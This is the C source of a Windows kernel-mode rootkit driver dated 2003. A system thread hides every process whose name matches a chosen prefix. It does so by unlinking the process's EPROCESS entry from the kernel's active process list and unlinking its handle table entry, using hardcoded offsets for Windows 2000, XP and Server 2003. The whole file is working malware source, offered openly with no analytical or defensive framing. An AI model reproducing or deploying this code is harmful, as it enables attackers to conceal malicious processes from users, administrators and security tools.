///////////////////////////////////////////////////////////////////////////////////////
// Filename Rootkit.c
// 
// Author: fuzen_op
// Email:  fuzen_op@yahoo.com or fuzen_op@rootkit.com
//
// Description: 
//
// Date:    5/27/2003
// Version: 2.0
//

#include "ntddk.h"
#include "stdio.h"
#include "stdlib.h"

#include "Rootkit.h"
#include "ProcessName.h"
   

#pragma code_seg(".text")


///////////////////////////
// IRQL = PASSIVE_LEVEL
//////////////////////////
NTSTATUS DriverEntry(
				   IN PDRIVER_OBJECT  DriverObject,
				   IN PUNICODE_STRING RegistryPath
					)
{
	
    NTSTATUS ntStatus;
	HANDLE   h_Thread;
	PEPROCESS p_curr;
	KIRQL OldIrql;
	DWORD d_nameOffset;
	PETHREAD l_Thread;
	ULONG flush;
	char sysName[20];

	////////////////////////////////////////
	// BEGIN HANDLE GLOBALS
	///////////////////////////////////////
	KeRaiseIrql(DISPATCH_LEVEL, &OldIrql);
	__asm {
		push eax;
		lea  eax, gd_procName;
		mov flush, eax
		invlpg flush;
		pop eax;
	} 
	
	// GLOBAL: gb_threadStop
	gb_threadStop = FALSE;
	// GLOBAL: gp_Thread
    gp_Thread = NULL;
	// GLOBAL: g_sysName
	strcpy( sysName, g_sysName );

	__asm invlpg flush
	KeLowerIrql(OldIrql);  
	//////////////////////////////////////
	// END HANDLE GLOBALS
	///////////////////////////////////////

	p_curr = PsGetCurrentProcess();

	d_nameOffset = GetLocationOfProcessName(p_curr, sysName);
	if (!d_nameOffset)
		return STATUS_UNSUCCESSFUL;

    DriverObject->DriverUnload = RootkitUnload;
   
	ntStatus = PsCreateSystemThread(&h_Thread,
									(ACCESS_MASK) 0,
									NULL,
									(HANDLE) 0,
									NULL,
									WorkerThread,
									NULL);
	if(!NT_SUCCESS(ntStatus))
		return STATUS_UNSUCCESSFUL;

	// GLOBAL: gp_Thread
	ntStatus = ObReferenceObjectByHandle(h_Thread, THREAD_ALL_ACCESS, NULL, KernelMode, (PVOID*) &l_Thread, NULL);
	ZwClose(h_Thread); // Close thread handle

	if (NT_SUCCESS(ntStatus))
	{

		////////////////////////////////////////
		// BEGIN HANDLE GLOBALS
		///////////////////////////////////////
		KeRaiseIrql(DISPATCH_LEVEL, &OldIrql);
		__asm invlpg flush; 
		// GLOBAL: gp_Thread
		gp_Thread = l_Thread;
		// GLOBAL: gd_procName
		gd_procName = d_nameOffset;
		__asm invlpg flush; 
		KeLowerIrql(OldIrql); 
		////////////////////////////////////////
		// END HANDLE GLOBALS
		///////////////////////////////////////
	}
    return STATUS_SUCCESS;
}


///////////////////////////
// IRQL = PASSIVE_LEVEL
//////////////////////////
NTSTATUS WorkerThread(IN PVOID pContext)
{
	NTSTATUS ntStatus;
	DWORD d_flink, d_tableOffset, d_tableList;
	LARGE_INTEGER waitTime;
	LONG SECONDS = 1; // Tune how often to check the EPROCESS list.
	DWORD d_procNameOffset;
	BOOLEAN b_threadStop;
	KIRQL OldIrql;
	ULONG flush;
	char hide[10];

	////////////////////////////////////////
	// BEGIN HANDLE GLOBALS
	///////////////////////////////////////
	KeRaiseIrql(DISPATCH_LEVEL, &OldIrql);

	__asm {
		push eax;
		lea  eax, gd_procName;
		mov flush, eax
		invlpg flush;
		pop eax;
	} 

	// GLOBAL: gd_procName
	d_procNameOffset = gd_procName;
	// GLOBAL: gb_threadStop
	b_threadStop = gb_threadStop; 
	// GLOBAL g_hide
	strcpy( hide, g_hide );

	__asm invlpg flush;
	KeLowerIrql(OldIrql);  
	////////////////////////////////////////
	// END HANDLE GLOBALS
	///////////////////////////////////////

	waitTime = RtlConvertLongToLargeInteger(-SECONDS*10000000);

	ntStatus = SetupGlobalsByOS(&d_flink, &d_tableOffset, &d_tableList);
    if(!NT_SUCCESS(ntStatus))
        return ntStatus;
	
	// GLOBAL: gb_threadStop
	while(!b_threadStop)
	{
	
		HideEPROCESSByPrefix(hide, d_procNameOffset, d_flink, d_tableOffset, d_tableList);
		KeDelayExecutionThread(KernelMode, TRUE, &waitTime);

		////////////////////////////////////////
		// BEGIN HANDLE GLOBALS
		///////////////////////////////////////
		KeRaiseIrql(DISPATCH_LEVEL, &OldIrql);
		__asm invlpg flush 
		// GLOBAL: gb_threadStop
		b_threadStop = gb_threadStop;
 		__asm invlpg flush
		KeLowerIrql(OldIrql);  
		////////////////////////////////////////
		// END HANDLE GLOBALS
		///////////////////////////////////////
	}
	//__asm int 1
	PsTerminateSystemThread(STATUS_SUCCESS);
	return STATUS_SUCCESS; // Never reached
}

///////////////////////////
// IRQL = PASSIVE_LEVEL
//////////////////////////
NTSTATUS RootkitUnload(IN PDRIVER_OBJECT DriverObject)
{   
	PETHREAD p_Thread;
	KIRQL OldIrql;
	ULONG flush;
	//__asm int 1
	////////////////////////////////////////
	// BEGIN HANDLE GLOBALS
	///////////////////////////////////////
	KeRaiseIrql(DISPATCH_LEVEL, &OldIrql);

	__asm {
		push eax;
		lea  eax, gp_Thread;
		mov flush, eax
		invlpg flush;
		pop eax;
	} 

 	// GLOBAL: gp_Thread
	p_Thread = gp_Thread;
	// GLOBAL: gb_threadStop
	gb_threadStop = TRUE;
 	
	__asm invlpg flush
	KeLowerIrql(OldIrql); 
	////////////////////////////////////////
	// END HANDLE GLOBALS
	////////////////////////////////////////

	if (p_Thread != NULL)
	{
		// Catch when the thread exits
		KeWaitForSingleObject(p_Thread,
							  Executive,
							  KernelMode,
							  FALSE,
							  NULL);
	}

	return STATUS_SUCCESS;
}


void HideEPROCESSByPrefix(char *p_name, DWORD d_procName, DWORD d_flinkOffset, DWORD d_tableOffset, DWORD d_tableList)
{ 
	int   len         = 0;
	PLIST_ENTRY plist_active_procs;
	DWORD curr_eproc, eproc;

	
	if (p_name == NULL)
		return;

	len = strlen(p_name);

	eproc = (DWORD) PsGetCurrentProcess();
	curr_eproc = eproc;

	do
	{
		plist_active_procs = (LIST_ENTRY *) (curr_eproc+d_flinkOffset);

		if(_strnicmp(p_name, (PVOID)(curr_eproc+d_procName) ,len) == 0)
		{
			// Change neighbors
			*((DWORD *)plist_active_procs->Blink) = (DWORD) plist_active_procs->Flink;
			*((DWORD *)plist_active_procs->Flink+1) = (DWORD) plist_active_procs->Blink;

			UnHookHandleListEntry((PEPROCESS)curr_eproc, d_tableOffset, d_tableList);

			// Advance
			curr_eproc = (DWORD) plist_active_procs->Flink;
			curr_eproc = curr_eproc - d_flinkOffset;

			// Point to ourselves
			plist_active_procs->Flink = (LIST_ENTRY *) &(plist_active_procs->Flink); // Change the current EPROCESS
			plist_active_procs->Blink = (LIST_ENTRY *) &(plist_active_procs->Flink); // so we don't point to crap
		}
		else 
		{
			curr_eproc = (DWORD) plist_active_procs->Flink;
			curr_eproc = curr_eproc - d_flinkOffset;
		}
	} while(eproc != curr_eproc);
}


void UnHookHandleListEntry(PEPROCESS eproc, DWORD d_handleTable, DWORD d_handleList)
{
	PLIST_ENTRY plist_hTable = NULL;
	plist_hTable = (PLIST_ENTRY)((*(PDWORD)((DWORD) eproc + d_handleTable)) + d_handleList);

	// Change neighbors because they point fingers
	*((DWORD *)plist_hTable->Blink) = (DWORD) plist_hTable->Flink;
	*((DWORD *)plist_hTable->Flink+1) = (DWORD) plist_hTable->Blink;

	plist_hTable->Flink = (LIST_ENTRY *) &(plist_hTable->Flink); // Change the current LIST_ENTRY
	plist_hTable->Blink = (LIST_ENTRY *) &(plist_hTable->Flink); // so we don't point to crap

}


NTSTATUS SetupGlobalsByOS(PDWORD pd_flink, PDWORD pd_tableoff, PDWORD pd_tablelist)
{
	RTL_QUERY_REGISTRY_TABLE paramTable[3];
	UNICODE_STRING ac_csdVersion;
	UNICODE_STRING ac_currentVersion;
	ANSI_STRING uc_csdVersion;
	ANSI_STRING uc_currentVersion;
	int dwMajorVersion = 0;
	int dwMinorVersion = 0;
	int spMajorVersion = 0;
	int spMinorVersion = 0;
	int i, i_numSpaces;
	NTSTATUS ntStatus;
	WCHAR strCurrentVersion[100], strCSDVersion[100];
	KIRQL OldIrql;
	ULONG flush;

	// Query the Registry to get the startup parameters to determine what functionality
	// is enabled.
	RtlZeroMemory(paramTable, sizeof(paramTable)); 
	RtlZeroMemory(&ac_currentVersion, sizeof(ac_currentVersion));
	RtlZeroMemory(&ac_csdVersion, sizeof(ac_csdVersion));

	////////////////////////////////////////
	// BEGIN HANDLE GLOBALS
	///////////////////////////////////////
	KeRaiseIrql(DISPATCH_LEVEL, &OldIrql);

	__asm {
		push eax;
		lea  eax, gp_Thread;
		mov flush, eax
		invlpg flush;
		pop eax;
	} 

 	// GLOBAL: g_strCurrentVersion
	RtlCopyMemory( strCurrentVersion, g_strCurrentVersion, 100 );
	// GLOBAL: g_strCSDVersion
	RtlCopyMemory( strCSDVersion, g_strCSDVersion, 100 );

	__asm invlpg flush
	KeLowerIrql(OldIrql); 
	////////////////////////////////////////
	// END HANDLE GLOBALS
	////////////////////////////////////////

	paramTable[0].Flags = RTL_QUERY_REGISTRY_DIRECT; 
	paramTable[0].Name = (PWSTR)&strCurrentVersion;
	paramTable[0].EntryContext = &ac_currentVersion;
	paramTable[0].DefaultType = REG_SZ; 
	paramTable[0].DefaultData = &ac_currentVersion; 
	paramTable[0].DefaultLength = sizeof(ac_currentVersion); 

	paramTable[1].Flags = RTL_QUERY_REGISTRY_DIRECT; 
	paramTable[1].Name = (PWSTR)&strCSDVersion;
	paramTable[1].EntryContext = &ac_csdVersion;
	paramTable[1].DefaultType = REG_SZ; 
	paramTable[1].DefaultData = &ac_csdVersion; 
	paramTable[1].DefaultLength = sizeof(ac_csdVersion); 

	ntStatus = RtlQueryRegistryValues( RTL_REGISTRY_WINDOWS_NT,
									   NULL,
									   paramTable, 
									   NULL, NULL  );
    if(!NT_SUCCESS(ntStatus)) 
		return ntStatus;

	ntStatus = RtlUnicodeStringToAnsiString(&uc_csdVersion, &ac_csdVersion, TRUE);
    if(!NT_SUCCESS(ntStatus)) 
	{	
		// Free the UNICODE ones
		RtlFreeUnicodeString(&ac_currentVersion);
		RtlFreeUnicodeString(&ac_csdVersion);
		return ntStatus;
	}
	ntStatus = RtlUnicodeStringToAnsiString(&uc_currentVersion, &ac_currentVersion, TRUE);
    if(!NT_SUCCESS(ntStatus)) 
	{	
		// Free the UNICODE ones
		RtlFreeUnicodeString(&ac_currentVersion);
		RtlFreeUnicodeString(&ac_csdVersion);
		// Free the ANSI ones
		RtlFreeAnsiString(&uc_csdVersion);
		return ntStatus;
	}

	// Free the UNICODE ones
	RtlFreeUnicodeString(&ac_currentVersion);
	RtlFreeUnicodeString(&ac_csdVersion);

	dwMajorVersion = atoi((char *)(uc_currentVersion.Buffer));
	dwMinorVersion = atoi((char *)(uc_currentVersion.Buffer+2));

	i_numSpaces = 0;
	for (i = 0; i < uc_csdVersion.Length; i++)
	{
		if (uc_csdVersion.Buffer[i] == ' ')
			i_numSpaces += 1;
		if (i_numSpaces == 2)
		{
			spMajorVersion = atoi(uc_csdVersion.Buffer+i+1);
			i_numSpaces += 1;
		}
		if (uc_csdVersion.Buffer[i] == '.')
			spMinorVersion = atoi(uc_csdVersion.Buffer+i+1);
	}

	// Free the ANSI ones
	RtlFreeAnsiString(&uc_currentVersion);
	RtlFreeAnsiString(&uc_csdVersion);
	
	if (dwMajorVersion == 4 && dwMinorVersion == 0)
	{
		// Stop supporting NT 4.0
		return STATUS_UNSUCCESSFUL;
	}
	else if (dwMajorVersion == 5 && dwMinorVersion == 0)
	{
		//fprintf(stderr, "Microsoft Windows 2000 ");
		*pd_flink = 160;
		*pd_tableoff = 0x128;
		*pd_tablelist = 0x54;
	}
	else if (dwMajorVersion == 5 && dwMinorVersion == 1)
	{
		//fprintf(stderr, "Microsoft Windows XP ");
		*pd_flink = 136;
		*pd_tableoff = 0xc4;
		*pd_tablelist = 0x1c;
	}
	else if (dwMajorVersion == 5 && dwMinorVersion == 2)
	{
		//fprintf(stderr, "Microsoft Windows Server 2003 ");
		*pd_flink = 136;
		*pd_tableoff = 0xc4;// ????
		*pd_tablelist = 0x1c; // ????
	}

	return STATUS_SUCCESS;
}

